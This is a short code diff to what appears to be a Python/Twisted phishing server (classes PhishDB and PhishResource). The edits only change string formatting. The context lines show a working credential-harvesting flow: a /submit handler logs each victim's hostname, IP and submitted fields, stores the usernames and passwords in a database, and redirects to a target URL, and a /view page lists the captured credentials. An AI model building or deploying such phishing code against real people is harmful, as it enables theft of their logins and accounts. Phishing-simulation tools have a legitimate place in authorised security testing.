@@ -85,7 +85,7 @@ class PhishDB():
         html += "[DATE], [IP], [USERNAME], [PASSWORD]\n";
         html += "------------------------------------\n";
         for row in cursor.fetchall():
-            html += '%s, %s, %s, %s\n' % (row[0], row[1], row[2], row[3])
+            html += '{0!s}, {1!s}, {2!s}, {3!s}\n'.format(row[0], row[1], row[2], row[3])
         html += "</pre>";
 
         return html
@@ -189,7 +189,7 @@ class PhishResource(resource.Resource):
         resource.Resource.__init__(self)
  
     def render(self, request):
-        subdomain = re.sub(r"\.%s$" % self.domainname, "", request.getRequestHostname())
+        subdomain = re.sub(r"\.{0!s}$".format(self.domainname), "", request.getRequestHostname())
         if (request.path == "/submit"):
             return self.captureCreds(request)
         elif ((subdomain == "" or subdomain == "www") and (request.path == "/view")):
@@ -300,7 +300,7 @@ class PhishResource(resource.Resource):
 
     def captureCreds(self, request):
         # log the credentials
-        print("::%s:: %s,[CREDENTIALS],%s,%s" % (request.getRequestHostname(),time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])))
+        print("::{0!s}:: {1!s},[CREDENTIALS],{2!s},{3!s}".format(request.getRequestHostname(), time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])))
         sys.stdout.flush()
         self.db.addLog(request.args["n"][0],request.getClientIP(),request.args["u"][0],request.args["p"][0])
         # redirect to target URL
